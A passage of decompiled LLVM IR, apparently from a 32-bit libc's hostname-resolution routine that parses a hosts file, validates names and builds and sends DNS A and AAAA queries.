  %tmp186 = bitcast i8** %stack_var_8 to i32*
  %tmp187 = bitcast i8** %stack_var_-3564 to i32*
  br label %dec_label_pc_804bd60.outer

dec_label_pc_804bc5b:                             ; preds = %dec_label_pc_804bd7e
  %v0_804bc5b = load i32, i32* @ecx, align 4
  %v5_804bc5b = inttoptr i32 %v0_804bc5b to i8*
  store i8* %v5_804bc5b, i8** %stack_var_-3556, align 4
  store i32 %v2_804bd6a, i32* %edx.global-to-local, align 4
  store i8* %tmp185, i8** %stack_var_-3564, align 4
  %v4_804bc67 = call i32 @strchr(i32 %v2_804bd6a, i8 35)
  store i32 %v4_804bc67, i32* %eax.global-to-local, align 4
  %v2_804bc6f = icmp eq i32 %v4_804bc67, 0
  store i1 %v2_804bc6f, i1* %zf.global-to-local, align 1
  br i1 %v2_804bc6f, label %dec_label_pc_804bc7a, label %dec_label_pc_804bc73

dec_label_pc_804bc73:                             ; preds = %dec_label_pc_804bc5b
  %v5_804bc67 = inttoptr i32 %v4_804bc67 to i8*
  store i8 10, i8* %v5_804bc67, align 1
  %v2_804bc76 = add i32 %v4_804bc67, 1
  %v3_804bc76 = inttoptr i32 %v2_804bc76 to i8*
  store i8 0, i8* %v3_804bc76, align 1
  br label %dec_label_pc_804bc7a

dec_label_pc_804bc7a:                             ; preds = %dec_label_pc_804bc5b, %dec_label_pc_804bc73
  %v0_804bc86.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804bc86

dec_label_pc_804bc83:                             ; preds = %dec_label_pc_804bcba, %dec_label_pc_804bca5
  %v1_804bc83 = add i32 %v8_804bc8a, 1
  br label %dec_label_pc_804bc86

dec_label_pc_804bc86:                             ; preds = %dec_label_pc_804bc7a, %dec_label_pc_804bc83
  %v0_804bc86 = phi i32 [ %v0_804bc86.pre, %dec_label_pc_804bc7a ], [ %v8_804bc8a, %dec_label_pc_804bc83 ]
  %storemerge20 = phi i32 [ %v2_804bc7a, %dec_label_pc_804bc7a ], [ %v1_804bc83, %dec_label_pc_804bc83 ]
  store i32 %storemerge20, i32* %eax.global-to-local, align 4
  %v5_804bc86 = inttoptr i32 %v0_804bc86 to i8*
  store i8* %v5_804bc86, i8** %stack_var_-3556, align 4
  %v0_804bc88 = load i32, i32* @esi, align 4
  %v5_804bc89 = inttoptr i32 %storemerge20 to i8*
  store i8* %v5_804bc89, i8** %stack_var_-3564, align 4
  %v7_804bc8a = inttoptr i32 %v0_804bc88 to i8*
  %v8_804bc8a = call i32 @strstr(i32 %storemerge20, i8* %v7_804bc8a, i32 %v0_804bc86, i32 %v0_804bc86)
  store i32 %v8_804bc8a, i32* %eax.global-to-local, align 4
  %v1_804bc92 = icmp eq i32 %v8_804bc8a, 0
  store i1 %v1_804bc92, i1* %zf.global-to-local, align 1
  store i32 %v8_804bc8a, i32* @edx, align 4
  br i1 %v1_804bc92, label %dec_label_pc_804bd60, label %dec_label_pc_804bc9c

dec_label_pc_804bc9c:                             ; preds = %dec_label_pc_804bc86
  %v1_804bc9c = add i32 %v8_804bc8a, -1
  %v2_804bc9c = inttoptr i32 %v1_804bc9c to i8*
  %v3_804bc9c = load i8, i8* %v2_804bc9c, align 1
  %v4_804bc9c = sext i8 %v3_804bc9c to i32
  store i32 %v4_804bc9c, i32* %eax.global-to-local, align 4
  %v6_804bca0 = icmp eq i8 %v3_804bc9c, 32
  store i1 %v6_804bca0, i1* %zf.global-to-local, align 1
  br i1 %v6_804bca0, label %dec_label_pc_804bcad, label %dec_label_pc_804bca5

dec_label_pc_804bca5:                             ; preds = %dec_label_pc_804bc9c
  %v1_804bca5 = add nsw i32 %v4_804bc9c, -9
  store i32 %v1_804bca5, i32* %eax.global-to-local, align 4
  %v9_804bca8 = icmp eq i8 %v3_804bc9c, 13
  store i1 %v9_804bca8, i1* %zf.global-to-local, align 1
  %v6_804bcab = icmp ugt i32 %v1_804bca5, 4
  br i1 %v6_804bcab, label %dec_label_pc_804bc83, label %dec_label_pc_804bcad

dec_label_pc_804bcad:                             ; preds = %dec_label_pc_804bca5, %dec_label_pc_804bc9c
  store i32 %v3_804bc22, i32* @ecx, align 4
  %v2_804bcb1 = add i32 %v8_804bc8a, %v3_804bc22
  %v3_804bcb1 = inttoptr i32 %v2_804bcb1 to i8*
  %v4_804bcb1 = load i8, i8* %v3_804bcb1, align 1
  %v5_804bcb1 = sext i8 %v4_804bcb1 to i32
  store i32 %v5_804bcb1, i32* %eax.global-to-local, align 4
  %v6_804bcb5 = icmp eq i8 %v4_804bcb1, 32
  store i1 %v6_804bcb5, i1* %zf.global-to-local, align 1
  br i1 %v6_804bcb5, label %dec_label_pc_804bccc.loopexit, label %dec_label_pc_804bcba

dec_label_pc_804bcba:                             ; preds = %dec_label_pc_804bcad
  %v1_804bcba = add nsw i32 %v5_804bcb1, -9
  store i32 %v1_804bcba, i32* %eax.global-to-local, align 4
  %v9_804bcbd = icmp eq i8 %v4_804bcb1, 13
  store i1 %v9_804bcbd, i1* %zf.global-to-local, align 1
  %v6_804bcc0 = icmp ugt i32 %v1_804bcba, 4
  br i1 %v6_804bcc0, label %dec_label_pc_804bc83, label %dec_label_pc_804bccc.loopexit

dec_label_pc_804bccb:                             ; preds = %dec_label_pc_804bcda
  %v1_804bccb = add i32 %v0_804bce2258, 1
  %v8_804bccb = icmp eq i32 %v1_804bccb, 0
  store i1 %v8_804bccb, i1* %zf.global-to-local, align 1
  store i32 %v1_804bccb, i32* @ebx, align 4
  %v1_804bccc = inttoptr i32 %v1_804bccb to i8*
  %v2_804bccc = load i8, i8* %v1_804bccc, align 1
  %v3_804bccc = zext i8 %v2_804bccc to i32
  %v5_804bccc = and i32 %v1_804bcda, -256
  %v6_804bccc = or i32 %v3_804bccc, %v5_804bccc
  store i32 %v6_804bccc, i32* %eax.global-to-local, align 4
  %v4_804bcce = icmp eq i8 %v2_804bccc, 0
  store i1 %v4_804bcce, i1* %zf.global-to-local, align 1
  br i1 %v4_804bcce, label %dec_label_pc_804bce2, label %dec_label_pc_804bcd2

dec_label_pc_804bccc.loopexit:                    ; preds = %dec_label_pc_804bcba, %dec_label_pc_804bcad
  %v4_804bccc.ph = phi i32 [ %v5_804bcb1, %dec_label_pc_804bcad ], [ %v1_804bcba, %dec_label_pc_804bcba ]
  store i32 %v2_804bd6a, i32* @ebx, align 4
  %v2_804bccc252 = load i8, i8* %tmp185, align 4
  %v3_804bccc253 = zext i8 %v2_804bccc252 to i32
  %v5_804bccc254 = and i32 %v4_804bccc.ph, -256
  %v6_804bccc255 = or i32 %v3_804bccc253, %v5_804bccc254
  store i32 %v6_804bccc255, i32* %eax.global-to-local, align 4
  %v4_804bcce256 = icmp eq i8 %v2_804bccc252, 0
  store i1 %v4_804bcce256, i1* %zf.global-to-local, align 1
  br i1 %v4_804bcce256, label %dec_label_pc_804bce2, label %dec_label_pc_804bcd2

dec_label_pc_804bcd2:                             ; preds = %dec_label_pc_804bccc.loopexit, %dec_label_pc_804bccb
  %v2_804bccc260 = phi i8 [ %v2_804bccc, %dec_label_pc_804bccb ], [ %v2_804bccc252, %dec_label_pc_804bccc.loopexit ]
  %v1_804bccc259 = phi i8* [ %v1_804bccc, %dec_label_pc_804bccb ], [ %tmp185, %dec_label_pc_804bccc.loopexit ]
  %v0_804bce2258 = phi i32 [ %v1_804bccb, %dec_label_pc_804bccb ], [ %v2_804bd6a, %dec_label_pc_804bccc.loopexit ]
  %v2_804bcd2 = sext i8 %v2_804bccc260 to i32
  store i32 %v2_804bcd2, i32* %eax.global-to-local, align 4
  %v6_804bcd5 = icmp eq i8 %v2_804bccc260, 32
  store i1 %v6_804bcd5, i1* %zf.global-to-local, align 1
  br i1 %v6_804bcd5, label %dec_label_pc_804bce2, label %dec_label_pc_804bcda

dec_label_pc_804bcda:                             ; preds = %dec_label_pc_804bcd2
  %v1_804bcda = add nsw i32 %v2_804bcd2, -9
  store i32 %v1_804bcda, i32* %eax.global-to-local, align 4
  %v9_804bcdd = icmp eq i8 %v2_804bccc260, 13
  store i1 %v9_804bcdd, i1* %zf.global-to-local, align 1
  %v6_804bce0 = icmp ugt i32 %v1_804bcda, 4
  br i1 %v6_804bce0, label %dec_label_pc_804bccb, label %dec_label_pc_804bce2

dec_label_pc_804bce2:                             ; preds = %dec_label_pc_804bccb, %dec_label_pc_804bcd2, %dec_label_pc_804bcda, %dec_label_pc_804bccc.loopexit
  %v1_804bccc.lcssa = phi i8* [ %tmp185, %dec_label_pc_804bccc.loopexit ], [ %v1_804bccc259, %dec_label_pc_804bcda ], [ %v1_804bccc259, %dec_label_pc_804bcd2 ], [ %v1_804bccc, %dec_label_pc_804bccb ]
  store i8 0, i8* %v1_804bccc.lcssa, align 1
  %v0_804bce5 = load i32, i32* @ebp, align 4
  store i32 %v0_804bce5, i32* @ecx, align 4
  %v7_804bce7 = mul i32 %stack_var_-3512.0.ph.in, 28
  %v4_804bcec = load i8*, i8** %stack_var_4, align 4
  %v5_804bcec = ptrtoint i8* %v4_804bcec to i32
  %v6_804bcec = add i32 %v5_804bcec, %v7_804bce7
  %v16_804bcec = icmp eq i32 %v6_804bcec, 0
  store i1 %v16_804bcec, i1* %zf.global-to-local, align 1
  store i32 %v6_804bcec, i32* @eax, align 4
  store i32 %v2_804bd6a, i32* @edx, align 4
  %v0_804bcfa = call i32 @name_from_numeric()
  store i32 %v0_804bcfa, i32* %eax.global-to-local, align 4
  %v5_804bcff = icmp eq i32 %v0_804bcfa, 0
  %v6_804bd02 = zext i1 %v5_804bcff to i32
  %v7_804bd02 = add i32 %stack_var_-3512.0.ph.in, 1
  %v8_804bd02 = add i32 %v6_804bd02, %v7_804bd02
  %v28_804bd02 = icmp eq i32 %v8_804bd02, 0
  store i1 %v28_804bd02, i1* %zf.global-to-local, align 1
  %v0_804bd07.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804bd07

dec_label_pc_804bd07:                             ; preds = %dec_label_pc_804bd1a, %dec_label_pc_804bd12, %dec_label_pc_804bce2
  %v4_804bd08 = phi i32 [ %v0_804bcfa, %dec_label_pc_804bce2 ], [ %v2_804bd12, %dec_label_pc_804bd12 ], [ %v1_804bd1a, %dec_label_pc_804bd1a ]
  %v0_804bd07 = phi i32 [ %v0_804bd07.pre, %dec_label_pc_804bce2 ], [ %v1_804bd07, %dec_label_pc_804bd12 ], [ %v1_804bd07, %dec_label_pc_804bd1a ]
  %v1_804bd07 = add i32 %v0_804bd07, 1
  %v8_804bd07 = icmp eq i32 %v1_804bd07, 0
  store i1 %v8_804bd07, i1* %zf.global-to-local, align 1
  store i32 %v1_804bd07, i32* @ebx, align 4
  %v1_804bd08 = inttoptr i32 %v1_804bd07 to i8*
  %v2_804bd08 = load i8, i8* %v1_804bd08, align 1
  %v3_804bd08 = zext i8 %v2_804bd08 to i32
  %v5_804bd08 = and i32 %v4_804bd08, -256
  %v6_804bd08 = or i32 %v3_804bd08, %v5_804bd08
  store i32 %v6_804bd08, i32* %eax.global-to-local, align 4
  %v4_804bd0a = icmp eq i8 %v2_804bd08, 0
  store i1 %v4_804bd0a, i1* %zf.global-to-local, align 1
  %v1_804bd0c = icmp eq i1 %v4_804bd0a, false
  br i1 %v1_804bd0c, label %dec_label_pc_804bd12, label %dec_label_pc_804bd0e

dec_label_pc_804bd0e:                             ; preds = %dec_label_pc_804bd1a, %dec_label_pc_804bd07
  %v4_804bd2583 = phi i32 [ %v1_804bd1a, %dec_label_pc_804bd1a ], [ %v6_804bd08, %dec_label_pc_804bd07 ]
  store i32 %v1_804bd07, i32* @edi, align 4
  %v2_804bd25265 = load i8, i8* %v1_804bd08, align 1
  %v3_804bd25266 = zext i8 %v2_804bd25265 to i32
  %v5_804bd25267 = and i32 %v4_804bd2583, -256
  %v6_804bd25268 = or i32 %v3_804bd25266, %v5_804bd25267
  store i32 %v6_804bd25268, i32* %eax.global-to-local, align 4
  %v4_804bd27269 = icmp eq i8 %v2_804bd25265, 0
  store i1 %v4_804bd27269, i1* %zf.global-to-local, align 1
  br i1 %v4_804bd27269, label %dec_label_pc_804bd3b, label %dec_label_pc_804bd2b

dec_label_pc_804bd12:                             ; preds = %dec_label_pc_804bd07
  %v2_804bd12 = sext i8 %v2_804bd08 to i32
  store i32 %v2_804bd12, i32* %eax.global-to-local, align 4
  %v6_804bd15 = icmp eq i8 %v2_804bd08, 32
  store i1 %v6_804bd15, i1* %zf.global-to-local, align 1
  br i1 %v6_804bd15, label %dec_label_pc_804bd07, label %dec_label_pc_804bd1a

dec_label_pc_804bd1a:                             ; preds = %dec_label_pc_804bd12
  %v1_804bd1a = add nsw i32 %v2_804bd12, -9
  store i32 %v1_804bd1a, i32* %eax.global-to-local, align 4
  %v5_804bd1d = icmp ult i32 %v1_804bd1a, 4
  %v9_804bd1d = icmp eq i8 %v2_804bd08, 13
  store i1 %v9_804bd1d, i1* %zf.global-to-local, align 1
  %v2_804bd20 = or i1 %v9_804bd1d, %v5_804bd1d
  br i1 %v2_804bd20, label %dec_label_pc_804bd07, label %dec_label_pc_804bd0e

dec_label_pc_804bd24:                             ; preds = %dec_label_pc_804bd33
  %v1_804bd24 = add i32 %v0_804bd3b271, 1
  %v8_804bd24 = icmp eq i32 %v1_804bd24, 0
  store i1 %v8_804bd24, i1* %zf.global-to-local, align 1
  store i32 %v1_804bd24, i32* @ebx, align 4
  %v1_804bd25 = inttoptr i32 %v1_804bd24 to i8*
  %v2_804bd25 = load i8, i8* %v1_804bd25, align 1
  %v3_804bd25 = zext i8 %v2_804bd25 to i32
  %v5_804bd25 = and i32 %v1_804bd33, -256
  %v6_804bd25 = or i32 %v3_804bd25, %v5_804bd25
  store i32 %v6_804bd25, i32* %eax.global-to-local, align 4
  %v4_804bd27 = icmp eq i8 %v2_804bd25, 0
  store i1 %v4_804bd27, i1* %zf.global-to-local, align 1
  br i1 %v4_804bd27, label %dec_label_pc_804bd3b, label %dec_label_pc_804bd2b

dec_label_pc_804bd2b:                             ; preds = %dec_label_pc_804bd0e, %dec_label_pc_804bd24
  %v2_804bd25273 = phi i8 [ %v2_804bd25, %dec_label_pc_804bd24 ], [ %v2_804bd25265, %dec_label_pc_804bd0e ]
  %v1_804bd25272 = phi i8* [ %v1_804bd25, %dec_label_pc_804bd24 ], [ %v1_804bd08, %dec_label_pc_804bd0e ]
  %v0_804bd3b271 = phi i32 [ %v1_804bd24, %dec_label_pc_804bd24 ], [ %v1_804bd07, %dec_label_pc_804bd0e ]
  %v2_804bd2b = sext i8 %v2_804bd25273 to i32
  store i32 %v2_804bd2b, i32* %eax.global-to-local, align 4
  %v6_804bd2e = icmp eq i8 %v2_804bd25273, 32
  store i1 %v6_804bd2e, i1* %zf.global-to-local, align 1
  br i1 %v6_804bd2e, label %dec_label_pc_804bd3b, label %dec_label_pc_804bd33

dec_label_pc_804bd33:                             ; preds = %dec_label_pc_804bd2b
  %v1_804bd33 = add nsw i32 %v2_804bd2b, -9
  store i32 %v1_804bd33, i32* %eax.global-to-local, align 4
  %v9_804bd36 = icmp eq i8 %v2_804bd25273, 13
  store i1 %v9_804bd36, i1* %zf.global-to-local, align 1
  %v6_804bd39 = icmp ugt i32 %v1_804bd33, 4
  br i1 %v6_804bd39, label %dec_label_pc_804bd24, label %dec_label_pc_804bd3b

dec_label_pc_804bd3b:                             ; preds = %dec_label_pc_804bd24, %dec_label_pc_804bd2b, %dec_label_pc_804bd33, %dec_label_pc_804bd0e
  %v1_804bd25.lcssa = phi i8* [ %v1_804bd08, %dec_label_pc_804bd0e ], [ %v1_804bd25272, %dec_label_pc_804bd33 ], [ %v1_804bd25272, %dec_label_pc_804bd2b ], [ %v1_804bd25, %dec_label_pc_804bd24 ]
  store i8 0, i8* %v1_804bd25.lcssa, align 1
  %v0_804bd3e = load i32, i32* @edi, align 4
  store i32 %v0_804bd3e, i32* @eax, align 4
  %v0_804bd40 = call i32 @is_valid_hostname()
  store i32 %v0_804bd40, i32* %eax.global-to-local, align 4
  %v1_804bd45 = icmp eq i32 %v0_804bd40, 0
  store i1 %v1_804bd45, i1* %zf.global-to-local, align 1
  br i1 %v1_804bd45, label %dec_label_pc_804bd60.outer, label %dec_label_pc_804bd49

dec_label_pc_804bd60.outer:                       ; preds = %dec_label_pc_804bd49, %dec_label_pc_804bd3b, %dec_label_pc_804bd60.preheader
  %stack_var_-3512.0.ph.in = phi i32 [ %v0_804bbff, %dec_label_pc_804bd60.preheader ], [ %v8_804bd02, %dec_label_pc_804bd3b ], [ %v8_804bd02, %dec_label_pc_804bd49 ]
  %v14_804bd7e = icmp eq i32 %stack_var_-3512.0.ph.in, 47
  %v7_804bd83 = icmp sgt i32 %stack_var_-3512.0.ph.in, 47
  br label %dec_label_pc_804bd60

dec_label_pc_804bd49:                             ; preds = %dec_label_pc_804bd3b
  %v0_804bd49 = load i32, i32* @ebx, align 4
  %v1_804bd49 = load i32, i32* @edi, align 4
  %v2_804bd49 = sub i32 %v0_804bd49, %v1_804bd49
  %v12_804bd49 = icmp eq i32 %v2_804bd49, 0
  store i1 %v12_804bd49, i1* %zf.global-to-local, align 1
  store i32 %v2_804bd49, i32* @ebx, align 4
  %v1_804bd4c = add i32 %v2_804bd49, 1
  store i32 %v1_804bd4c, i32* %eax.global-to-local, align 4
  %v5_804bd4f = inttoptr i32 %v1_804bd4c to i8*
  store i8* %v5_804bd4f, i8** %stack_var_-3556, align 4
  %v3_804bd5122 = load i32, i32* %tmp186, align 4
  store i32 %v3_804bd5122, i32* %tmp187, align 4
  %v0_804bd58.cast = inttoptr i32 %v3_804bd5122 to i8*
  %v6_804bd58 = call i32 @memcpy(i8* %v0_804bd58.cast, i32 %v1_804bd49, i32 %v1_804bd4c)
  store i32 %v6_804bd58, i32* %eax.global-to-local, align 4
  %v0_804bd5d = load i32, i32* @esp, align 4
  %v6_804bd5d = icmp eq i32 %v0_804bd5d, -16
  store i1 %v6_804bd5d, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804bd60.outer

dec_label_pc_804bd60:                             ; preds = %dec_label_pc_804bc86, %dec_label_pc_804bd60.outer
  store i8* %v8_804bd61, i8** %stack_var_-3556, align 4
  store i32 %v2_804bd6a, i32* %eax.global-to-local, align 4
  store i8* %tmp185, i8** %stack_var_-3564, align 4
  %v6_804bd72 = call i32 @fgets(i8* %tmp185, i32 512, i32 %v6_804bc42)
  store i32 %v6_804bd72, i32* %eax.global-to-local, align 4
  %v1_804bd7a = icmp eq i32 %v6_804bd72, 0
  store i1 %v1_804bd7a, i1* %zf.global-to-local, align 1
  br i1 %v1_804bd7a, label %dec_label_pc_804bd89, label %dec_label_pc_804bd7e

dec_label_pc_804bd7e:                             ; preds = %dec_label_pc_804bd60
  store i1 %v14_804bd7e, i1* %zf.global-to-local, align 1
  br i1 %v7_804bd83, label %dec_label_pc_804bd89, label %dec_label_pc_804bc5b

dec_label_pc_804bd89:                             ; preds = %dec_label_pc_804bd7e, %dec_label_pc_804bd60
  %v9_804bd89 = icmp eq i32* %stack_var_-3548, inttoptr (i32 12 to i32*)
  store i1 %v9_804bd89, i1* %zf.global-to-local, align 1
  store i8* %v8_804bd61, i8** %stack_var_-3564, align 4
  %v2_804bd90 = call i32 @__fclose_ca(i32 %v6_804bc42)
  store i32 %v2_804bd90, i32* %eax.global-to-local, align 4
  %v5_804bd98 = icmp eq i32 %stack_var_-3512.0.ph.in, 0
  store i1 %v5_804bd98, i1* %zf.global-to-local, align 1
  %v1_804bd9d = icmp eq i1 %v5_804bd98, false
  br i1 %v1_804bd9d, label %dec_label_pc_804bf30, label %dec_label_pc_804bda3

dec_label_pc_804bda3:                             ; preds = %dec_label_pc_804bc1e, %dec_label_pc_804bd89
  store i32 0, i32* @ebx, align 4
  %v2_804bdb3 = ptrtoint i32* %stack_var_-2468 to i32
  store i1 false, i1* @df, align 1
  store i32 %v2_804bdb3, i32* %stack_var_-40, align 4
  %v2_804bdd0 = ptrtoint i8** %stack_var_-68 to i32
  store i32 0, i32* %eax.global-to-local, align 4
  %v8_804bdd9 = add i32 %v2_804bdd0, 4
  store i32 %v8_804bdd9, i32* %edi.global-to-local, align 4
  %v2_804bdda = ptrtoint i32* %stack_var_-1444 to i32
  store i32 %v2_804bdda, i32* %edx.global-to-local, align 4
  %v0_804bde1 = load i32, i32* @ebp, align 4
  %v9_804bde1 = icmp eq i32 %v0_804bde1, 10
  store i1 %v9_804bde1, i1* %zf.global-to-local, align 1
  store i32 %v2_804bdda, i32* %stack_var_-32, align 4
  %v2_804bdeb = inttoptr i32 %v8_804bdd9 to i32*
  store i32 0, i32* %v2_804bdeb, align 4
  %v3_804bdeb = load i32, i32* %edi.global-to-local, align 4
  %v6_804bdeb = add i32 %v3_804bdeb, 4
  store i32 %v6_804bdeb, i32* %edi.global-to-local, align 4
  %v0_804bdec = load i32, i32* %eax.global-to-local, align 4
  %v2_804bdec = inttoptr i32 %v6_804bdeb to i32*
  store i32 %v0_804bdec, i32* %v2_804bdec, align 4
  %v3_804bdec = load i32, i32* %edi.global-to-local, align 4
  %v6_804bdec = add i32 %v3_804bdec, 4
  store i32 %v6_804bdec, i32* %edi.global-to-local, align 4
  %v3_804bded = load i8*, i8** %stack_var_4, align 4
  %v4_804bded = ptrtoint i8* %v3_804bded to i32
  store i32 %v4_804bded, i32* %ecx.global-to-local, align 4
  %v3_804bdf4 = load i8*, i8** %stack_var_8, align 4
  %v4_804bdf4 = ptrtoint i8* %v3_804bdf4 to i32
  store i32 %v4_804bdf4, i32* %eax.global-to-local, align 4
  store i8* %v3_804bded, i8** %stack_var_-68, align 4
  br i1 %v9_804bde1, label %dec_label_pc_804bda3.dec_label_pc_804be3c_crit_edge, label %dec_label_pc_804be0b

dec_label_pc_804bda3.dec_label_pc_804be3c_crit_edge: ; preds = %dec_label_pc_804bda3
  %v1_804be3c.pre = load i32, i32* @ebx, align 4
  %v0_804be42.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804be3c

dec_label_pc_804be0b:                             ; preds = %dec_label_pc_804bda3
  %v0_804be0b = load i32, i32* @esp, align 4
  %v9_804be0b = icmp eq i32 %v0_804be0b, 12
  store i1 %v9_804be0b, i1* %zf.global-to-local, align 1
  store i32 1, i32* @edi, align 4
  store i8* inttoptr (i32 280 to i8*), i8** %stack_var_-3564, align 4
  %v0_804be23 = load i32, i32* @esi, align 4
  %v12_804be26 = call i32 @__res_mkquery(i8 0, i32 %v0_804be23, i32 1, i32 1, i32 0, i32 0, i32 0, i32 %v2_804bdda, i32 280)
  store i32 %v12_804be26, i32* %eax.global-to-local, align 4
  store i32 %v12_804be26, i32* %stack_var_-48, align 4
  %v0_804be35 = load i32, i32* @ebp, align 4
  %v9_804be35 = icmp eq i32 %v0_804be35, 2
  store i1 %v9_804be35, i1* %zf.global-to-local, align 1
  br i1 %v9_804be35, label %dec_label_pc_804be71, label %dec_label_pc_804be3a

dec_label_pc_804be3a:                             ; preds = %dec_label_pc_804be0b
  %v0_804be3a = load i32, i32* @ebx, align 4
  %v1_804be3a = and i32 %v0_804be3a, -256
  %v2_804be3a = or i32 %v1_804be3a, 1
  store i32 %v2_804be3a, i32* @ebx, align 4
  br label %dec_label_pc_804be3c

dec_label_pc_804be3c:                             ; preds = %dec_label_pc_804bda3.dec_label_pc_804be3c_crit_edge, %dec_label_pc_804be3a
  %v0_804be42 = phi i32 [ %v0_804be42.pre, %dec_label_pc_804bda3.dec_label_pc_804be3c_crit_edge ], [ %v15_804ba43, %dec_label_pc_804be3a ]
  %v0_804be4a = phi i32 [ %v1_804be3c.pre, %dec_label_pc_804bda3.dec_label_pc_804be3c_crit_edge ], [ %v2_804be3a, %dec_label_pc_804be3a ]
  %v3_804be3c = mul i32 %v0_804be4a, 280
  %v9_804be42 = icmp eq i32 %v0_804be42, 12
  store i1 %v9_804be42, i1* %zf.global-to-local, align 1
  store i8* inttoptr (i32 280 to i8*), i8** %stack_var_-3564, align 4
  %v1_804be4a = add i32 %v0_804be4a, 1
  store i32 %v1_804be4a, i32* @edi, align 4
  %v2_804be4d = add i32 %v6_804bc21, 2120
  %v3_804be4d = add i32 %v2_804be4d, %v3_804be3c
  store i32 %v3_804be4d, i32* %eax.global-to-local, align 4
  %v0_804be5f = load i32, i32* @esi, align 4
  %v12_804be62 = call i32 @__res_mkquery(i8 0, i32 %v0_804be5f, i32 1, i32 28, i32 0, i32 0, i32 0, i32 %v3_804be4d, i32 280)
  store i32 %v12_804be62, i32* %eax.global-to-local, align 4
  %v1_804be67 = load i32, i32* @esp, align 4
  %v2_804be67 = load i32, i32* @ebx, align 4
  %v3_804be67 = mul i32 %v2_804be67, 4
  %v4_804be67 = add i32 %v1_804be67, 3548
  %v5_804be67 = add i32 %v4_804be67, %v3_804be67
  %v6_804be67 = inttoptr i32 %v5_804be67 to i32*
  store i32 %v12_804be62, i32* %v6_804be67, align 4
  %v0_804be6e = load i32, i32* @esp, align 4
  %v6_804be6e = icmp eq i32 %v0_804be6e, -48
  store i1 %v6_804be6e, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804be71

dec_label_pc_804be71:                             ; preds = %dec_label_pc_804be0b, %dec_label_pc_804be3c
  %v0_804be71 = load i32, i32* @ecx, align 4
  %v5_804be71 = inttoptr i32 %v0_804be71 to i8*
  store i8* %v5_804be71, i8** %stack_var_-3556, align 4
  %v2_804be78 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_804be78, i32* @edx, align 4
  %tmp188 = bitcast i32* %stack_var_-56 to i8*
  store i8* %tmp188, i8** %stack_var_-3564, align 4
  %v2_804be80 = ptrtoint i32* %stack_var_-40 to i32
  %v2_804be88 = ptrtoint i32* %stack_var_-48 to i32
  %v2_804be90 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804be90, i32* %eax.global-to-local, align 4
  %v0_804be98 = load i32, i32* @edi, align 4
  %v12_804be99 = call i32 @__res_msend(i32 %v0_804be98, i32 %v2_804be90, i32 %v2_804be88, i32 %v2_804be80, i32 %v2_804be78, i32 512, i32 %v0_804be71, i32 %v0_804be71)
  store i32 %v12_804be99, i32* %eax.global-to-local, align 4
  %v1_804bea9 = icmp eq i32 %v12_804be99, 0
  store i1 %v1_804bea9, i1* %zf.global-to-local, align 1
  %v2_804bea9 = icmp slt i32 %v12_804be99, 0
  br i1 %v2_804bea9, label %dec_label_pc_804c261, label %dec_label_pc_804beb1

dec_label_pc_804beb1:                             ; preds = %dec_label_pc_804be71
  %v6_804be72 = ptrtoint i8** %stack_var_-3556 to i32
  store i32 %v2_804bdb3, i32* @esi, align 4
  store i32 0, i32* @ebx, align 4
  %v3_804bec9 = add i32 %v6_804be72, 3500
  %v1_804bee0242 = load i32, i32* @edi, align 4
  %v12_804bee0247 = icmp eq i32 %v1_804bee0242, 0
  store i1 %v12_804bee0247, i1* %zf.global-to-local, align 1
  %v5_804bee2249 = icmp sgt i32 %v1_804bee0242, 0
  br i1 %v5_804bee2249, label %dec_label_pc_804bebc, label %dec_label_pc_804bee4

dec_label_pc_804bebc:                             ; preds = %dec_label_pc_804beb1, %dec_label_pc_804bebc.dec_label_pc_804bebc_crit_edge
  %v0_804bed1 = phi i32 [ %v0_804bed1.pre, %dec_label_pc_804bebc.dec_label_pc_804bebc_crit_edge ], [ %v2_804bdb3, %dec_label_pc_804beb1 ]
  %v0_804bed0250 = phi i32 [ %v0_804bee0.pre, %dec_label_pc_804bebc.dec_label_pc_804bebc_crit_edge ], [ 0, %dec_label_pc_804beb1 ]
  store i32 %v2_804bdd0, i32* @ecx, align 4
  store i8* inttoptr (i32 134527200 to i8*), i8** %stack_var_-3556, align 4
  %v2_804bec9 = mul i32 %v0_804bed0250, 4
  %v4_804bec9 = add i32 %v3_804bec9, %v2_804bec9
  %v5_804bec9 = inttoptr i32 %v4_804bec9 to i32*
  %v6_804bec9 = load i32, i32* %v5_804bec9, align 4
  %v1_804bed0 = add i32 %v0_804bed0250, 1
  store i32 %v1_804bed0, i32* @ebx, align 4
  %v5_804bed1 = inttoptr i32 %v0_804bed1 to i8*
  store i8* %v5_804bed1, i8** %stack_var_-3564, align 4
  %v1_804bed2 = add i32 %v0_804bed1, 512
  %v6_804bed2 = icmp eq i32 %v1_804bed2, 0
  store i1 %v6_804bed2, i1* %zf.global-to-local, align 1
  store i32 %v1_804bed2, i32* @esi, align 4
  %v7_804bed8 = call i32 @__dns_parse(i32 %v0_804bed1, i32 %v6_804bec9, i32 134527200, i32 %v2_804bdd0)
  store i32 %v7_804bed8, i32* %eax.global-to-local, align 4
  %v0_804bee0.pre = load i32, i32* @ebx, align 4
  %v1_804bee0 = load i32, i32* @edi, align 4
  %v12_804bee0 = icmp eq i32 %v0_804bee0.pre, %v1_804bee0
  store i1 %v12_804bee0, i1* %zf.global-to-local, align 1
  %v5_804bee2 = icmp slt i32 %v0_804bee0.pre, %v1_804bee0
  br i1 %v5_804bee2, label %dec_label_pc_804bebc.dec_label_pc_804bebc_crit_edge, label %dec_label_pc_804bee4

dec_label_pc_804bebc.dec_label_pc_804bebc_crit_edge: ; preds = %dec_label_pc_804bebc
  %v0_804bed1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804bebc

dec_label_pc_804bee4:                             ; preds = %dec_label_pc_804bebc, %dec_label_pc_804beb1
  %v4_804bee4 = trunc i64 %tmp121 to i32
  store i32 %v4_804bee4, i32* %eax.global-to-local, align 4
  %v1_804beeb = icmp eq i32 %v4_804bee4, 0
  store i1 %v1_804beeb, i1* %zf.global-to-local, align 1
  %v1_804bef1 = icmp eq i1 %v1_804beeb, false
  br i1 %v1_804bef1, label %dec_label_pc_804bf30, label %dec_label_pc_804bef3

dec_label_pc_804bef3:                             ; preds = %dec_label_pc_804bee4
  %v3_804bef3 = load i32, i32* %stack_var_-56, align 4
